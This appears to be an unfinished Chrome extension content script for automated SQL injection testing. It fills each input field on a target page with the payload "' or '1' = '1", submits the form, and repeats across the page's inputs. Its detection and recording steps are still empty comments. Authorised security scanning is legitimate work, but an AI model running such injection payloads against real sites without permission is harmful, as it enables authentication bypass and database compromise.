var last_target = null;


document.addEventListener('mousedown', function(event){
    //possibility: check that the mouse button == 2
    last_target = event.target;
}, true);

$(document).ready(function(){ 
    var scanStatus;
    var attackUrl;
    chrome.storage.sync.get("scanning", function(obj){
        scanStatus = obj.scanning.status;
        attackUrl = obj.scanning.url;

        if (scanStatus) {

            //scan for signature

            //record results

            //revert back to initial page
            if ( location != attackUrl ) {
                setTimeout(function() {
                    location = attackUrl;
                },1000);
            }
            //next payload
            if ( location == attackUrl ) {
                chrome.storage.sync.set({'scanning':{status:true,url:attackUrl,payload:obj.scanning.payload,index:obj.scanning.index+1}});
                scan(obj.scanning.payload,attackUrl,obj.scanning.index-1);
            }
        }
    });
});


function scan(payload,url,index) {
    inputs = document.getElementsByTagName('input');
    if( index < inputs.length ){
        inputs[index].value= "' or '1' = '1";
        inputs[index].style.outline = "none";
        inputs[index].style.border = "red 2px solid";
        inputs[index].style.boxShadow  = "0 0 10px red";
        inputs[index].form.submit(); 
    } else {
        chrome.storage.sync.set({'scanning':{status:false,url:"",payload:"",index:0}});
        alert("Scan Done!");
    }

}



//onmessage for start of attack
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        //  console.log(sender.tab ? "from a content script:" + sender.tab.url : "from the extension");
        //  console.log(request.payload);
        if ( request.type == "start" ) {
            scan(request.payload,request.url,0);
        }

        //if (request.greeting == "hello") sendResponse({farewell: "goodbye"});
    });


var inputObject;

//scan page for inputs
